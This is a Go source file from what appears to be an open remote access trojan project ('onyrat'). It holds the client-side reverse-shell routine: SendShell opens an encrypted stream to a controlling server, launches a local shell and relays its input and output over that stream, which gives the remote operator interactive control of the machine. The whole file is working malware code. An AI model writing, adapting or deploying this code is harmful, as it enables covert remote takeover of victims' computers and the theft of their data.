//go:build client
// +build client

package remoteshell

import (
	"fmt"
	"io"
	"time"

	"github.com/Onyz107/onyrat/pkg/network"
)

func SendShell(c *network.KCPClient) error {
	stream, err := c.Manager.OpenStream(shellStream, 20*time.Second)
	if err != nil {
		return fmt.Errorf("failed to open the shell stream: %w", err)
	}
	defer stream.Close()

	stdout, stdin, cmd, err := getHandles()
	if err != nil {
		return fmt.Errorf("failed to get terminal handles: %w", err)
	}

	// Read from stdout and send to stream
	w, err := c.NewStreamedEncryptedSender(stream, 0)
	if err != nil {
		return fmt.Errorf("failed to get streamed sender: %w", err)
	}

	go io.Copy(w, stdout)

	// Read from stream and write to stdin
	r, err := c.NewStreamedEncryptedReceiver(stream, 0)
	if err != nil {
		return fmt.Errorf("failed to get streamed receiver: %w", err)
	}

	go func() {
		io.Copy(stdin, r) // Read from stdin to stream, when stream is closed kill process
		cmd.Process.Kill()
	}()

	if err := cmd.Wait(); err != nil {
		return fmt.Errorf("command wait error: %w", err)
	}

	return nil
}
